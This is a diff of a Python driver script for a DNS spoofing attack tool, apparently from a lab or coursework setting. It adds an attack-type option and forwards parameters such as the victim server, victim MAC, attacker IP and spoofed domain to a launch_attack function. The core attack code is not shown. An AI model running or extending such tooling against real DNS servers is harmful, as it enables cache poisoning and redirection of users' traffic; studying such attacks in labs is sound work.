@@ -41,7 +41,7 @@ log_file = "log_secret.txt"
 #   Verbosity can be set in order to suppres the output
 #
 def log(msg, verbosity=1):
-    if verbosity > custom_verbosity:
+    if verbosity < custom_verbosity:
         if use_colors:
                 print(msg.format(t=term))
         else:
@@ -102,7 +102,7 @@ def secret_fetcher(server_ip, server_port):
 #       @param domain                   The domain to spoof
 #
 def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip,\
-         number_of_tries=None, victim_mac=None, nic_interface=None):
+         number_of_tries=None, victim_mac=None, nic_interface=None, attack_type=None):
 
         attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
                  attacker_ip, victim_mac=victim_mac, nic_interface=nic_interface,\
@@ -166,7 +166,7 @@ def fetch_parameter(*args):
         parser.add_argument('-ns', '--ns-server', dest='ns_server', help='The victim authoritative server', required=False, type=str)
         parser.add_argument('-i', '--interface', dest='interface', help='The Network Card interface to use', required=False, type=str)
 
-        parser.add_argument('-at', '--attack-type', dest='attack_type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str)
+        parser.add_argument('-at', '--attack-type', dest='attack_type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str, default='NORMAL')
         parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
        
         parser.add_argument('-vm', '--victim-mac', dest='victim_mac', help='The victim MAC address', required=False, type=str)
@@ -246,6 +246,10 @@ def main(*args):
         victim_mac = param['victim_mac']
         nic_interface = param['interface']
 
+        # @todo add the attack type
+        attack_type = param['attack_type']
+
+
 
         #Launch the secret fetcher
         secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port),daemon=True)
@@ -253,7 +257,8 @@ def main(*args):
 
         try:
 
-                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30, victim_mac=victim_mac)
+                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30,\
+                         victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface)
 
         except DNSAttack.CriticalError:
                 log("\n{t.red}{t.bold}Critical Error occurred{t.normal}!!!\nTerminating")
